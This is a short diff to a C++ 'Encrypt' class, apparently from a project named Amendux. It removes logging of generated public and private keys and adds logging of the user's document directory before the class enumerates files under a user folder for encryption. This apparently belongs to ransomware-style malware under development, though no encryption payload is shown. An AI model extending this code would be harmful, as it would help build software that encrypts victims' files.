@@ -17,17 +17,6 @@ void Encrypt::genLocalKeypair()
 {
 	/* We generate this once */
 	crypto_box_keypair(clientPublicKey, clientSecretKey);
-
-	std::string y = Amendux::Util::Hex<unsigned char *>(clientPublickey(), crypto_box_PUBLICKEYBYTES);
-	std::string x = Amendux::Util::Hex<unsigned char *>(clientPrivatekey(), crypto_box_SECRETKEYBYTES);
-
-	std::wstring wy;
-	std::wstring wx;
-	wy.assign(y.begin(), y.end());
-	wx.assign(x.begin(), x.end());
-
-	log << "pubkey: " << wy << "\n";
-	log << "privkey: " << wx << "\n";
 }
 
 
@@ -35,17 +24,6 @@ void Encrypt::setLocalKeypair(unsigned char *publickey, unsigned char *privateke
 {
 	memcpy(clientPublicKey, publickey, crypto_box_PUBLICKEYBYTES);
 	memcpy(clientSecretKey, privatekey, crypto_box_SECRETKEYBYTES);
-
-	std::string y = Amendux::Util::Hex<unsigned char *>(clientPublickey(), crypto_box_PUBLICKEYBYTES);
-	std::string x = Amendux::Util::Hex<unsigned char *>(clientPrivatekey(), crypto_box_SECRETKEYBYTES);
-
-	std::wstring wy;
-	std::wstring wx;
-	wy.assign(y.begin(), y.end());
-	wx.assign(x.begin(), x.end());
-
-	log << "pubkey: " << wy << "\n";
-	log << "privkey: " << wx << "\n";
 }
 
 
@@ -158,7 +136,8 @@ Encrypt::~Encrypt()
 
 void Encrypt::Run()
 {
-	// this->getDirFiles(L"C:\\Users\\yoric");
+	log << "[Encrypt] userdir: " << Util::getUserDocumentDirectory() << "\n";
+
 	this->getDirFiles(L"C:\\Users\\yoric\\Documents\\CRYPT");
 }
 
